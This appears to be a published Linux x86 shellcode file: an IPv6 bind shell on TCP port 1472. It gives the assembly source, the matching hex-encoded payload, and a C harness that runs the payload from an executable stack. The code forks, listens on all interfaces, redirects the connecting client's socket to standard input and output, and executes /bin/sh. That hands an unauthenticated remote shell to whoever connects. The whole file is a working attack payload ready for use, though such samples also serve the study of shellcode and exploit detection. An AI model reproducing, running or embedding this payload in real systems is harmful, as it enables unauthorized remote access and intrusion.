// # Title: linux x86 bind tcp 1472 port (ipv6)
// # Length : 1,250 bytes
// # Author : Roziul Hasan Khan Shifat
// # Tested On : kali linux 2.0 and Ubuntu 14.04 LTS
// # Contact : shifath12@gmail.com

/*
section .text
	global _start
_start:

xor eax,eax
xor ebx,ebx

mov al,2 ;fork()
int 80h

xor ebx,ebx

cmp eax,ebx
je all

xor eax,eax
mov al,1
int 80h


all:
;;socket() ipv6
push  6
push  1
push  10

xor eax,eax
xor ebx,ebx

mov al,0x66
inc ebx
mov ecx,esp
int 0x80


;socket created

mov esi,eax ;storing socket des

xor eax,eax

;bind();;;

push DWORD eax
push DWORD eax
push DWORD eax
push DWORD eax
push eax		;sin6_addr

push WORD 0xc005	;port 1472
push WORD 0x0a		;AF_inet

mov ecx,esp

push 0x1c
push ecx
push esi

xor ebx,ebx
mov bl,2
mov ecx,esp
mov al,0x66
int 80h

;;listen
xor eax,eax
xor ebx,ebx

push byte 2
push esi

mov ecx,esp
mov bl,4
mov al,102
int 80h

;;accept

xor ebx,ebx

push ebx
push ebx
push esi

mul ebx

mov bl,5
mov al,102
mov ecx,esp
int 80h

;;close()
mov ebx,esi

mov esi,eax ;storing client scoket des

xor eax,eax
mov al,6
int 80h


;dup2(sd,0)

xor ecx,ecx
mul ecx

mov ebx,esi
mov al,63
int 80h

;dup2(sd,1)

xor eax,eax
inc ecx

mov ebx,esi
mov al,63
int 80h

;dup2(sd,2)

xor eax,eax
inc ecx

mov ebx,esi
mov al,63
int 80h

;;execve(/bin//sh)

xor edx,edx
mul edx

push edx ;null terminated /bin//sh
push 0x68732f2f
push 0x6e69622f

mov ebx,esp

push edx
push ebx

mov ecx,esp

mov al,11 ;execve()
int 0x80


*/

/*
to compile shellcode

$gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$./shellcode

*/


#include<stdio.h>
#include<string.h>

char shellcode[]="\x31\xc0\x31\xdb\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74\x06\x31\xc0\xb0\x01\xcd\x80\x6a\x06\x6a\x01\x6a\x0a\x31\xc0\x31\xdb\xb0\x66\x43\x89\xe1\xcd\x80\x89\xc6\x31\xc0\x50\x50\x50\x50\x50\x66\x68\x05\xc0\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x31\xdb\xb3\x02\x89\xe1\xb0\x66\xcd\x80\x31\xc0\x31\xdb\x6a\x02\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xdb\x53\x53\x56\xf7\xe3\xb3\x05\xb0\x66\x89\xe1\xcd\x80\x89\xf3\x89\xc6\x31\xc0\xb0\x06\xcd\x80\x31\xc9\xf7\xe1\x89\xf3\xb0\x3f\xcd\x80\x31\xc0\x41\x89\xf3\xb0\x3f\xcd\x80\x31\xc0\x41\x89\xf3\xb0\x3f\xcd\x80\x31\xd2\xf7\xe2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";


main()
{

printf("shellcode length %ld",(long)strlen(shellcode));

(* (int(*)()) shellcode ) ();
}